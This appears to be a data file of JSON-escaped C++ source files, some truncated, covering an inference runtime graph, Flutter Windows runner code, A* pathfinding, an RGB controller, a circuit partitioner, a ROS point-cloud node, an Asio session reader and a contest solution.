    "#include \"infer_ir.hpp\"\n#include \"status_code.hpp\"\n#include \"pnnx/ir.h\"\n#include <deque>\n#include <iostream>\n#include <memory>\n#include <utility>\n#include <vector>\n\nnamespace infer_neto {\nRuntimeGraph::RuntimeGraph(std::string param_path, std::string bin_path)\n        : param_path_(std::move(param_path)), bin_path_(std::move(bin_path)) {}\n\nvoid RuntimeGraph::set_bin_path(const std::string &bin_path) {\n    this->bin_path_ = bin_path;\n}\n\nvoid RuntimeGraph::set_param_path(const std::string &param_path) {\n    this->param_path_ = param_path;\n}\n\nconst std::string &RuntimeGraph::param_path() const {\n    return this->param_path_;\n}\n\nconst std::string &RuntimeGraph::bin_path() const { return this->bin_path_; }\n\nbool RuntimeGraph::Init() {\n    if (this->bin_path_.empty() || this->param_path_.empty()) {\n        LOG(ERROR) << \"The bin path or param path is empty\";\n        return false;\n    }\n\n    this->graph_ = std::make_unique<pnnx::Graph>();\n    int load_result = this->graph_->load(param_path_, bin_path_);\n    if (load_result != 0) {\n        LOG(ERROR) << \"Can not find the param path or bin path: \" << param_path_\n                   << \" \" << bin_path_;\n        return false;\n    }\n\n    std::vector<pnnx::Operator *> operators = this->graph_->ops;\n    if (operators.empty()) {\n        LOG(ERROR) << \"Can not read the layers' define\";\n        return false;\n    }\n\n    this->operators_.clear();\n    this->operators_maps_.clear();\n    for (const pnnx::Operator *op: operators) {\n        if (!op) {\n            LOG(ERROR) << \"Meet the empty node\";\n            continue;\n        } else {\n            std::shared_ptr<RuntimeOperator> runtime_operator =\n                    std::make_shared<RuntimeOperator>();\n            // \u521d\u59cb\u5316\u7b97\u5b50\u7684\u540d\u79f0\n            runtime_operator->name = op->name;\n            runtime_operator->type = op->type;\n\n            // \u521d\u59cb\u5316\u7b97\u5b50\u4e2d\u7684input\n            const std::vector<pnnx::Operand *> &inputs = op->inputs;\n            if (!inputs.empty()) {\n                InitGraphOperatorsInput(inputs, runtime_operator);\n            }\n\n            // \u8bb0\u5f55\u8f93\u51faoperand\u4e2d\u7684\u540d\u79f0\n            const std::vector<pnnx::Operand *> &outputs = op->outputs;\n            if (!outputs.empty()) {\n                InitGraphOperatorsOutput(outputs, runtime_operator);\n            }\n\n            // \u521d\u59cb\u5316\u7b97\u5b50\u4e2d\u7684attribute(\u6743\u91cd)\n            const std::map<std::string, pnnx::Attribute> &attrs = op->attrs;\n            if (!attrs.empty()) {\n                InitGraphAttrs(attrs, runtime_operator);\n            }\n\n            // \u521d\u59cb\u5316\u7b97\u5b50\u4e2d\u7684parameter\n            const std::map<std::string, pnnx::Parameter> &params = op->params;\n            if (!params.empty()) {\n                InitGraphParams(params, runtime_operator);\n            }\n            this->operators_.push_back(runtime_operator);\n            this->operators_maps_.insert({runtime_operator->name, runtime_operator});\n        }\n    }\n\n    return true;\n}\n\nvoid RuntimeGraph::Build(const std::string &input_name,\n                         const std::string &output_name) {\n    if (graph_state_ == GraphState::Complete) {\n        LOG(INFO) << \"Model has been built already!\";\n        return;\n    }\n\n    if (graph_state_ == GraphState::NeedInit) {\n        bool init_graph = Init();\n        LOG_IF(FATAL, !init_graph) << \"Init graph failed!\";\n    }\n\n    CHECK(graph_state_ >= GraphState::NeedBuild)\n                    << \"Graph status error, current state is \" << int(graph_state_);\n    LOG_IF(FATAL, this->operators_.empty())\n                    << \"Graph operators is empty, may be no init\";\n\n    // \u6784\u5efa\u56fe\u5173\u7cfb\n    for (const auto &current_op : this->operators_) {\n        // \u83b7\u53d6\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u540e\u7ee7\u8282\u70b9\u7684names\uff0c\u904d\u5386\u6839\u636enext_op_name\u4eceoperators_maps_\u4e2d\u63d2\u5165\u6240\u9700\u8981\u7684\u8282\u70b9\n        const std::vector<std::string> &output_names = current_op->output_names;\n        for (const auto &kOutputName : output_names) {\n            if (const auto &output_op = this->operators_maps_.find(kOutputName);\n                    output_op != this->operators_maps_.end()) {\n                current_op->output_operators.insert({kOutputName, output_op->second});\n            }\n        }\n    }\n\n    // \u521d\u59cb\u5316\u8282\u70b9\u7684\u8f93\u5165\u548c\u8f93\u51fa\u7a7a\u95f4\n    RuntimeOperatorUtils::InitOperatorInput(operators_);\n    RuntimeOperatorUtils::InitOperatorOutput(graph_->ops, operators_);\n\n    // \u6784\u5efa\u62d3\u6251\u987a\u5e8f\n    topo_operators_.clear();\n    for (const auto &[_, op] : operators_maps_) {\n        // \u6839\u636e\u8f93\u5165\u8282\u70b9\u6784\u5efa\u62d3\u6251\u6392\u5e8f\n        if (op->type == \"pnnx.Input\" && !op->has_forward) {\n            this->ReverseTopo(op);\n        }\n    }\n\n    CHECK(topo_operators_.size() == operators_.size())\n                    << \"Build wrong topo queue\";\n    std::reverse(topo_operators_.begin(), topo_operators_.end());\n\n    graph_state_ = GraphState::Complete;\n    input_name_ = input_name;\n    output_name_ = output_name;\n    if (graph_ != nullptr) {\n        graph_.reset();\n        graph_ = nullptr;\n    }\n}\nvoid RuntimeGraph::ReverseTopo(\n        const std::shared_ptr<RuntimeOperator> &root_op) {\n    CHECK(root_op != nullptr) << \"current operator is nullptr\";\n    root_op->has_forward = true;\n    const aut",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <cmath>\nusing namespace std;\n\nstruct Node {\n    int x, y;\n    int g, h;\n    Node* parent;\n\n    Node(int x, int y, int g, int h, Node* parent) : x(x), y(y), g(g), h(h), parent(parent) {}\n\n    int f() const {\n        return g + h;\n    }\n};\n\nvector<Node*> findPath(const vector<vector<int>>& grid, const pair<int, int>& start, const pair<int, int>& end) {\n    int dx[4] = {1, -1, 0, 0};\n    int dy[4] = {0, 0, 1, -1};\n\n    int rows = grid.size();\n    int cols = grid[0].size();\n\n    auto isValid = [&](int x, int y) {\n        return x >= 0 && x < rows && y >= 0 && y < cols && grid[x][y] == 0;\n    };\n\n    auto manhattanDistance = [&](int x1, int y1, int x2, int y2) {\n        return abs(x2 - x1) + abs(y2 - y1);\n    };\n\n    vector<vector<bool>> visited(rows, vector<bool>(cols, false));\n    priority_queue<pair<int, Node*>, vector<pair<int, Node*>>, greater<pair<int, Node*>>> pq;\n    pq.push({0, new Node(start.first, start.second, 0, manhattanDistance(start.first, start.second, end.first, end.second), nullptr)});\n\n    while (!pq.empty()) {\n        auto [priority, current] = pq.top();\n        pq.pop();\n\n        if (current->x == end.first && current->y == end.second) {\n            vector<Node*> path;\n            while (current != nullptr) {\n                path.push_back(current);\n                current = current->parent;\n            }\n            return path;\n        }\n\n        if (visited[current->x][current->y]) continue;\n        visited[current->x][current->y] = true;\n\n        for (int i = 0; i < 4; ++i) {\n            int nx = current->x + dx[i];\n            int ny = current->y + dy[i];\n\n            if (isValid(nx, ny) && !visited[nx][ny]) {\n                pq.push({current->g + 1 + manhattanDistance(nx, ny, end.first, end.second),\n                         new Node(nx, ny, current->g + 1, manhattanDistance(nx, ny, end.first, end.second), current)});\n            }\n        }\n    }\n\n    return {};\n}\n\nint main() {\n    vector<vector<int>> grid = {\n    {0, 0, 0, 0, 0, 0, 0, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 0, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 0, 1, 1, 0},\n    {0, 1, 0, 0, 0, 0, 0, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 0, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {1, 1, 0, 0, 0, 0, 0, 0, 1, 0},\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 1},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0}\n};\n\n    pair<int, int> start = {0, 0};\n    pair<int, int> end = {19, 7};\n\n    auto path = findPath(grid, start, end);\n\n    if (!path.empty()) {\n        cout << \"Caminho encontrado:\" << endl;\n        for (int i = path.size() - 1; i >= 0; --i) {\n            cout << \"(\" << path[i]->x << \", \" << path[i]->y << \")\" << endl;\n        }\n    } else {\n        cout << \"Nenhum caminho encontrado.\" << endl;\n    }\n\n    return 0;\n}\n",
    "/*-----------------------------------------*\\\n|  RGBController_MSIRGB.cpp                 |\n|                                           |\n|  Generic RGB Interface for MSI-RGB        |\n|                                           |\n|  Adam Honse (CalcProgrammer1) 2/14/2020   |\n\\*-----------------------------------------*/\n\n#include \"RGBController_MSIRGB.h\"\n\n/**------------------------------------------------------------------*\\\n    @name MSI RGB\n    @category Motherboard\n    @type SuperIO\n    @save :x:\n    @direct :white_check_mark:\n    @effects :x:\n    @detectors DetectMSIRGBControllers\n    @comment\n\\*-------------------------------------------------------------------*/\n\nRGBController_MSIRGB::RGBController_MSIRGB(MSIRGBController* controller_ptr)\n{\n    controller  = controller_ptr;\n\n    name        = \"MSI Motherboard\";\n    vendor      = \"MSI\";\n    type        = DEVICE_TYPE_MOTHERBOARD;\n    description = \"MSI-RGB Device\";\n\n    mode Direct;\n    Direct.name       = \"Direct\";\n    Direct.value      = 0;\n    Direct.flags      = MODE_FLAG_HAS_PER_LED_COLOR;\n    Direct.color_mode = MODE_COLORS_PER_LED;\n    modes.push_back(Direct);\n\n    SetupZones();\n}\n\nRGBController_MSIRGB::~RGBController_MSIRGB()\n{\n    delete controller;\n}\n\nvoid RGBController_MSIRGB::SetupZones()\n{\n    zone msi_zone;\n    msi_zone.name           = \"MSI Zone\";\n    msi_zone.type           = ZONE_TYPE_SINGLE;\n    msi_zone.leds_min       = 1;\n    msi_zone.leds_max       = 1;\n    msi_zone.leds_count     = 1;\n    msi_zone.matrix_map     = NULL;\n    zones.push_back(msi_zone);\n\n    led msi_led;\n    msi_led.name = \"MSI LED\";\n    leds.push_back(msi_led);\n\n    SetupColors();\n}\n\nvoid RGBController_MSIRGB::ResizeZone(int /*zone*/, int /*new_size*/)\n{\n\n}\n\nvoid RGBController_MSIRGB::DeviceUpdateLEDs()\n{\n    RGBColor      color = colors[0];\n    unsigned char red   = RGBGetRValue(color);\n    unsigned char grn   = RGBGetGValue(color);\n    unsigned char blu   = RGBGetBValue(color);\n\n    controller->SetColor(red, grn, blu);\n}\n\nvoid RGBController_MSIRGB::UpdateZoneLEDs(int /*zone*/)\n{\n    DeviceUpdateLEDs();\n}\n\nvoid RGBController_MSIRGB::UpdateSingleLED(int /*led*/)\n{\n    DeviceUpdateLEDs();\n}\n\nvoid RGBController_MSIRGB::DeviceUpdateMode()\n{\n\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <cassert>\r\n#include <vector>\r\n#include <cmath>\r\n#include <map>\r\n#include \"cell.h\"\r\n#include \"net.h\"\r\n#include \"partitioner.h\"\r\nusing namespace std;\r\n\r\nvoid Partitioner::parseInput(fstream &inFile)\r\n{\r\n    string str;\r\n    // Set balance factor\r\n    inFile >> str;\r\n    _bFactor = stod(str);\r\n\r\n    // Set up whole circuit\r\n    while (inFile >> str)\r\n    {\r\n        if (str == \"NET\")\r\n        {\r\n            string netName, cellName, tmpCellName = \"\";\r\n            inFile >> netName;\r\n            int netId = _netNum;\r\n            _netArray.push_back(new Net(netName));\r\n            _netName2Id[netName] = netId;\r\n            while (inFile >> cellName)\r\n            {\r\n                if (cellName == \";\")\r\n                {\r\n                    tmpCellName = \"\";\r\n                    break;\r\n                }\r\n                else\r\n                {\r\n                    // a newly seen cell\r\n                    if (_cellName2Id.count(cellName) == 0)\r\n                    {\r\n                        int cellId = _cellNum;\r\n                        _cellArray.push_back(new Cell(cellName, 0, cellId));\r\n                        _cellName2Id[cellName] = cellId;\r\n                        _cellArray[cellId]->addNet(netId);\r\n                        _cellArray[cellId]->incPinNum();\r\n                        _netArray[netId]->addCell(cellId);\r\n                        ++_cellNum;\r\n                        tmpCellName = cellName;\r\n                    }\r\n                    // an existed cell\r\n                    else\r\n                    {\r\n                        if (cellName != tmpCellName)\r\n                        {\r\n                            assert(_cellName2Id.count(cellName) == 1);\r\n                            int cellId = _cellName2Id[cellName];\r\n                            _cellArray[cellId]->addNet(netId);\r\n                            _cellArray[cellId]->incPinNum();\r\n                            _netArray[netId]->addCell(cellId);\r\n                            tmpCellName = cellName;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            ++_netNum;\r\n        }\r\n    }\r\n    return;\r\n}\r\n\r\nvoid Partitioner::init_part()\r\n{\r\n    min = (1-_bFactor)*_cellNum/2;\r\n    for (int i = 0; i < _cellNum; i++)\r\n    {\r\n        // if (_cellArray[i]->getPinNum() > _maxPinNum)\r\n        //     _maxPinNum++;\r\n        if (i >= _cellNum / 2)\r\n        {\r\n            _cellArray[i]->setPart(1);\r\n        }\r\n    }\r\n}\r\nvoid Partitioner::init_part1(){\r\n    min = (1-_bFactor)*_cellNum/2;\r\n    int n = 0;\r\n    for(int i=0;i<_netNum;i++){\r\n        vector<int> list = _netArray[i]->getCellList();\r\n        for(int j=0;j<list.size();j++){\r\n            if(!_cellArray[list[j]]->getPart()){\r\n                n++;\r\n                _cellArray[list[j]]->move();\r\n            }\r\n            if (n>_cellNum/2)\r\n                return;   \r\n        }\r\n    }\r\n}\r\nvoid Partitioner::init_part2(){\r\n    min = (1-_bFactor)*_cellNum/2;\r\n    int n = 0;\r\n    int index;\r\n    vector<int> c;\r\n    init();\r\n    for(int i=0;i<_cellNum/2;i++){\r\n        index = choose_max();\r\n        c.push_back(index);\r\n        update_gain(index);\r\n    }\r\n    for(int i=0;i<c.size();i++){\r\n        _cellArray[c[i]]->move();\r\n    }\r\n}\r\nvoid Partitioner::init_size_and_count(){\r\n    //reset size and count\r\n    _partSize[0] = 0;\r\n    _partSize[1] = 0;\r\n    for(int i = 0; i < _netNum; i++){\r\n        _netArray[i]->setPartCount(0,0);\r\n        _netArray[i]->setPartCount(1,0);\r\n    }\r\n    for(int i = 0; i < _cellNum; i++)\r\n    {\r\n        vector<int> list = _cellArray[i]->getNetList();\r\n        if(!_cellArray[i]->getPart()){\r\n            _partSize[0]++;\r\n            for (int j = 0; j < list.size(); j++)\r\n            {\r\n                _netArray[list[j]]->incPartCount(0);\r\n            }\r\n        }\r\n        else{\r\n            _partSize[1]++;\r\n            for (int j = 0; j < list.size(); j++)\r\n            {\r\n                _netArray[list[j]]->incPartCount(1);\r\n            }\r\n        }\r\n    }\r\n}\r\nvoid Partitioner::set_cutSize()\r\n{\r\n    _cutSize = 0;\r\n    for (int i = 0; i < _netNum; i++)\r\n    {\r\n        if (_netArray[i]->getPartCount(0) > 0 && _netArray[i]->getPartCount(1) > 0)\r\n            _cutSize++;\r\n    }\r\n    // cout<<_cutSize<<endl;\r\n}\r\nvoid Partitioner::add_cell(int i)\r\n{\r\n    if(_cellArray[i]->getLock()){\r\n        return;\r\n    }\r\n    // cout << i << endl;\r\n    map<int, Node *>::iterator itr;\r\n    Node *node = _cellArray[i]->getNode();\r\n    node->setNext(nullptr);\r\n    node->setPrev(nullptr);\r\n    // get gain\r\n    int gain = _cellArray[i]->getGain();\r\n    // cell in A(0)\r\n    if (!_cellArray[i]->getPart())\r\n    {\r\n        itr = _bList[0].find(gain);\r\n        if (itr == _bList[0].end())\r\n        {\r\n            _bList[0][gain] = node;\r\n        }\r\n        else\r\n        {\r\n            (*itr).second->setPrev(node);\r\n            node->setNext((*itr).second);\r\n            _bList[0][gain] = node;\r\n   ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"pcl_filtering_tutorial.hpp\"\n\n\nPclFilteringTutorial::PclFilteringTutorial()\n{\n    // Point cloud Pointer \ucd08\uae30\ud654\n    pcd_source_pcptr_.reset(new pcl::PointCloud<pcl::PointXYZ>());\n    pcd_target_pcptr_.reset(new pcl::PointCloud<pcl::PointXYZ>());\n\n}\n\nPclFilteringTutorial::~PclFilteringTutorial()\n{\n\n}\n\nvoid PclFilteringTutorial::Init()\n{\n    ROS_INFO(\"Init\");\n\n    ros::NodeHandle nh;\n\n    if(CheckParam() == false){\n        ROS_ERROR(\"Init Fail\");\n        return;\n    }\n\n\n    p_pcd_source_origin_ = nh.advertise<sensor_msgs::PointCloud2>(\"source_pcd_origin\", 10);\n    p_pcd_target_origin_ = nh.advertise<sensor_msgs::PointCloud2>(\"target_pcd_origin\", 10);\n\n\n    // Load PCD\n    if (pcl::io::loadPCDFile<pcl::PointXYZ> (cfg_str_pcd_source_path_, *pcd_source_pcptr_) == -1){\n        ROS_ERROR_STREAM(\"Cannot Read file: \" << cfg_str_pcd_source_path_);\n        return;\n    }\n    else{\n        ROS_WARN_STREAM(\"File Loaded From: \" << cfg_str_pcd_source_path_);\n    }\n\n    if (pcl::io::loadPCDFile<pcl::PointXYZ> (cfg_str_pcd_target_path_,*pcd_target_pcptr_) == -1){\n        ROS_ERROR_STREAM(\"Cannot Read file: \" << cfg_str_pcd_target_path_);\n        return;\n    }\n    else{\n        ROS_WARN_STREAM(\"File Loaded From: \" << cfg_str_pcd_target_path_);\n        return;\n    }\n\n    ROS_INFO(\"Init Done\");\n    b_is_init_ = true;\n}\n\nbool PclFilteringTutorial::CheckParam()\n{\n    ros::NodeHandle nh;\n    if (!nh.getParam(\"/pcd_path/pcd_source\", cfg_str_pcd_source_path_)) return false;  \n    if (!nh.getParam(\"/pcd_path/pcd_target\", cfg_str_pcd_target_path_)) return false;  \n    if (!nh.getParam(\"/pcl_filtering_tutorial/registration_method\", cfg_i_registration_method_)) return false;  \n\n    std::string dir(ros::package::getPath(\"pcl_filtering_tutorial\") + \"/../../\");\n    cfg_str_pcd_source_path_ = dir + cfg_str_pcd_source_path_;\n    cfg_str_pcd_target_path_ = dir + cfg_str_pcd_target_path_;\n\n    std::cout<<\"cfg_str_pcd_source_path_: \"<<cfg_str_pcd_source_path_<<std::endl;\n    std::cout<<\"cfg_str_pcd_target_path_: \"<<cfg_str_pcd_target_path_<<std::endl;\n    std::cout<<\"cfg_i_registration_method_: \"<<cfg_i_registration_method_<<std::endl;\n\n    return true;\n}\n\nvoid PclFilteringTutorial::Run()\n{\n    ROS_INFO(\"Run\");\n    if(b_is_init_ == false) return;\n\n}\n\nvoid PclFilteringTutorial::Publish()\n{\n    ROS_INFO(\"Publish Data\");\n    if(b_is_init_ == false) return;\n\n    p_pcd_source_origin_.publish(o_pcd_source_origin_msg_);\n    p_pcd_target_origin_.publish(o_pcd_target_origin_msg_);\n}\n\n\n\nint main(int argc, char **argv) {\n    std::string node_name = \"pcl_filtering_tutorial\";\n    ros::init(argc, argv, node_name);\n    ros::NodeHandle nh;\n\n    ROS_INFO(\"Initialize node, get parameters...\");\n\n    PclFilteringTutorial PRT;\n\n    PRT.Init();\n    PRT.Run();\n    \n    ros::Rate rate(1); // 1 Hz\n    while (ros::ok()) {\n        PRT.Publish();\n        rate.sleep();    // Sleep to control the loop rate\n    }\n\n    return 0;\n}",
    "#include \"Session.h\"\n\nvoid Session::Start()\n{\n    std::memset(_data, 0, MAX_LENGTH);\n    _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                             std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n}\n\nSession::~Session(){\n    delete[] _data;\n}\n\nstd::string Session::GetUid(){\n    return _uid;\n}\n\nusing SocketNo = boost::asio::ip::tcp::socket;\nSocketNo& Session::Socket(){\n    return _socket;\n}\n\nvoid Session::Close(){\n    _socket.close();\n    _sys_close = true;\n}\n\nstd::shared_ptr<Session> Session::SharedSelf(){\n    return shared_from_this();\n}\n\nvoid Session::SetUid(const std::string& uid){\n    _uid = uid;\n}\n\nvoid Session::HandleRead(const ErrorCode& ec,std::size_t transfer_len,std::shared_ptr<Session>){\n    try\n    { \n        if(!ec){\n            while(!_sys_close){ \n                //\u5934\u6ca1\u89e3\u6790\u5b8c\n                if(!_head_read){\n                    int remain = HEAD_LENGTH - _head_ptr->_cur_len;\n                    //\u65b0\u4f20\u8fdb\u6765\u7684\u4e0d\u591f\u63a5\u6536\u5934\n                    if(transfer_len < remain){\n                        std::memcpy(_head_ptr->_data,_data,transfer_len);\n                        std::memset(_data,0,transfer_len);\n                        _head_ptr->_cur_len += transfer_len;\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                                std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n                        return;\n                    }\n                    //\u65b0\u4f20\u8fdb\u6765\u7684\u591f\u63a5\u6536\u5934\n                    std::memcpy(_head_ptr->_data,_data,remain);\n                    _head_read = true;\n                    transfer_len -= remain;\n                    short msg_len = 0;\n                    unsigned short msg_id = 0;\n                    std::memcpy(&msg_len,_head_ptr->_data,MSGLEN_LENGTH);\n                    std::memcpy(&msg_id,_head_ptr->_data + MSGID_LENGTH,MSGID_LENGTH);\n                    //\u7f51\u7edc\u5b57\u8282\u5e8f\u8f6c\u5316\u4e3a\u672c\u5730\u5b57\u8282\u5e8f\n                    msg_len = boost::asio::detail::socket_ops::network_to_host_short(msg_len);\n                    msg_id = boost::asio::detail::socket_ops::network_to_host_short(msg_id);\n                    //TODO \u5904\u7406msg_len \u548c msg_id \u8d8a\u754c\n                    if(msg_len > TASK_LENGTH){\n                        //TODO \u8e22\u6389\u7528\u6237\n\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                                std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n                        return;\n                    }\n                    if(msg_id > TASK_LENGTH){\n                        //TODO \u8e22\u6389\u7528\u6237\n\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                                std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n                        return;\n                    }\n\n                    //\u6784\u9020\u63a5\u53d7\u8282\u70b9\n                    _recv_ptr = std::make_shared<RecvNode>(msg_len,msg_id);\n                    if(transfer_len == 0) return;\n                    //\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u591f\u4f20\u6ee1node\n                    if(transfer_len < msg_len){\n                        std::memcpy(_recv_ptr->_data,_data+remain,transfer_len);\n                        _recv_ptr->_cur_len += transfer_len;\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                                std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n                        return;\n                    }\n                    std::memcpy(_recv_ptr->_data,_data+remain,msg_len);\n                    //TODO \u5c55\u793a\u4fe1\u606f\n                    \n                    _head_ptr->Clear();\n                    transfer_len -= msg_len;\n                    if(transfer_len > 0) continue;\n                    if(transfer_len == 0){\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                                                                std::placeholders::_1, std::placeholders::_2, SharedSelf()));\n                        return;\n                    }\n                }\n                //\u5934\u89e3\u6790\u5b8c\u4e86\n                else{\n                    int remain = _recv_ptr->_msg_len - _recv_ptr->_cur_len;\n                    //\u4e0d\u591f\u4f20\n                    if(transfer_len < remain){\n                        std::memcpy(_recv_ptr->_data+_recv_ptr->_cur_len , _data,transfer_len);\n                        _recv_ptr->_cur_len += transfer_len;\n                        _socket.async_read_some(boost::asio::buffer(_data, MAX_LENGTH), std::bind(&Session::HandleRead, this,\n                                     ",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nbool sorting(const pair<int, int> &a, const pair<int, int> &b)\r\n{\r\n    if (a.first != b.first)\r\n    {\r\n        return a.first < b.first;\r\n    }\r\n    return a.second < b.second;\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, q;\r\n    cin >> n;\r\n    ll a[n];\r\n    ll b[n];\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> a[i];\r\n    }\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> b[i];\r\n    }\r\n    vector<pair<ll, ll>> v;\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        v.emplace_back(make_pair(a[i], b[i]));\r\n    }\r\n    sort(all(v), sorting);\r\n    cin >> q;\r\n    while (q--)\r\n    {\r\n        bool ok = 0;\r\n        ll s = 0, e = 0;\r\n        cin >> s >> e;\r\n        ll l = 0, r = n, ans = -1, mid;\r\n        while (l <= r)\r\n        {\r\n            mid = l + (r - l) / 2;\r\n            if (v[mid].first <= s)\r\n            {\r\n                l = mid + 1;\r\n                ans = mid;\r\n            }\r\n            else\r\n            {\r\n                r = mid - 1;\r\n            }\r\n        }\r\n        if (ans == -1)\r\n        {\r\n            cout << \"NO\" << endl;\r\n            continue;\r\n        }\r\n        for (size_t i = 0; i <= ans; i++)\r\n        {\r\n            if (v[i].second >= e)\r\n            {\r\n                cout << \"YES\" << endl;\r\n                ok = 1;\r\n                break;\r\n            }\r\n        }\r\n        if (!ok)\r\n        {\r\n            cout << \"NO\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}\r\n",
